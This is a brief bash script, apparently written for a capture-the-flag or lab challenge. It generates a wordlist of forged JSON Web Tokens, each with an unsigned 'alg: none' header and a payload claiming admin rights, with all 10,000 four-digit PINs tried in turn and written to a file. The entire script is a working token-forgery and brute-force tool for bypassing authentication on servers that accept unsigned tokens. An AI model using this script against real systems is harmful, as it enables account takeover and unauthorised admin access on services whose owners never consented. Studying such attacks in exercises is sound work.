#!/bin/bash

# Function to generate all 4-digit PINs and insert them into the string
generate_pins_and_insert() {
    for ((i=0; i<=9; i++)); do
        for ((j=0; j<=9; j++)); do
            for ((k=0; k<=9; k++)); do
                for ((l=0; l<=9; l++)); do
                    pin=$(printf "%d%d%d%d" $i $j $k $l)
                    string='{"user":"admin", "is_admin":true, "flag":true, "pin":"'$pin'"}'
		    base64_encoded=$(echo -n "$string" | base64)
		    echo "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.$base64_encoded." >> pins
                done
            done
        done
    done
}

# Generate and print all PINs inserted into the string
generate_pins_and_insert

sed -i 's/=//g' pins
